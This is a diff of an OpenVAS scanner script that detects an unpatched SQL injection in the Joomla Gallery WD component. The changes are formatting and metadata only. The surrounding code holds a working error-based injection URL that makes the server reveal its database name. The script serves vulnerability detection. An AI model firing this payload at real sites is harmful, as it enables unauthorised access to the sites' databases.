@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_gallery_wd_sql_vuln.nasl 6600 2017-07-07 09:58:31Z teissa $
+# $Id: gb_joomla_gallery_wd_sql_vuln.nasl 11225 2018-09-04 13:06:36Z mmartin $
 #
 # Joomla Gallery WD Component Multiple Parameter SQL Injection Vulnerability
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:joomla:joomla";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805447");
-  script_version("$Revision: 6600 $");
+  script_version("$Revision: 11225 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-07 11:58:31 +0200 (Fri, 07 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 15:06:36 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-04-09 11:27:25 +0530 (Thu, 09 Apr 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Joomla Gallery WD Component Multiple Parameter SQL Injection Vulnerability");
@@ -54,16 +54,14 @@ if(description)
 
   script_tag(name:"affected", value:"Joomla Gallery WD component.");
 
-  script_tag(name: "solution" , value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/36560");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/131186");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/36560");
+  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/131186");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -80,28 +78,20 @@ include("http_keepalive.inc");
 include("host_details.inc");
 
 
-# Variable Initialization
-http_port = 0;
-dir = "";
-
-## Get HTTP Port
 if(!http_port = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get Joomla Location
 if(!dir = get_app_location(cpe:CPE, port:http_port)){
   exit(0);
 }
 
-##Construct Attack Request
 url = dir + "/index.php?option=com_gallery_wd&view=gallerybox&image_id=19"+
             "&gallery_id=2&theme_id=1%20AND%20(SELECT%206173%20FROM(SELECT%"+
             "20COUNT(*),CONCAT(0x716b627871,SQL-INJECTION-TEST(MID((IFNULL("+
             "CAST(database()%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND"+
             "(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&lang=fr";
 
-##Confirm exploit
 if(http_vuln_check(port:http_port, url:url, pattern:"SQL-INJECTION-TEST",
                    extra_check:"You have an error in your SQL syntax"))
 {
